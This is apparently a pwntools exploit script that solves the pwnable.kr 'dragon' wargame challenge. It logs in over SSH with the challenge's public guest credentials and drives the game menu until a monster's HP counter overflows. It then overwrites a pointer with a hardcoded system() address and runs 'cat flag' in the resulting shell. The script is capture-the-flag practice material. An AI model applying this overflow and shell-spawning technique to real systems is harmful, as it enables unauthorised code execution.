#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9004 ./dragon
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./dragon')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or "dragon"
password = args.PASSWORD or "guest"
remote_path = "dragon"

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.connect_remote("127.0.0.1", 9004)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# player types
PRIEST = 1
KNIGHT = 2

# priest attacks
HOLY_BOLT = 1
CLARITY = 2
HOLY_SHIELD = 3

# knight attacks
CRASH = 1
FRENZY = 2

SYSTEM_ADDR = 0x8048dbf

def choose_player(io, player: int):
    io.recvuntil(b"[ 2 ] Knight\n")

    io.sendline(str(player).encode())

def do_priest_menu(io, action: int):
    io.recvuntil(b"You Become Temporarily Invincible.\n")

    io.sendline(str(action).encode())

def do_knight_menu(io, action: int):
    io.recvuntil(b"Deals 40 Damage, But You Lose 20 HP.\n")

    io.sendline(str(action).encode())

io = start()

# let the baby win
choose_player(io, KNIGHT)

do_knight_menu(io, FRENZY)

# now kill mama
choose_player(io, PRIEST)

with log.progress('fighting mama dragon...') as p:
    for _ in range(4):
        p.status("Holy Shield 1")
        do_priest_menu(io, HOLY_SHIELD)
        p.status("Holy Shield 2")
        do_priest_menu(io, HOLY_SHIELD)
        p.status("Clarity")
        do_priest_menu(io, CLARITY)
    
    p.success()

# mama has overflowed
io.recvuntil(b"The World Will Remember You As:\n")
io.sendline(p32(SYSTEM_ADDR))

io.recvline()

io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip().removeprefix('$ '))}'")

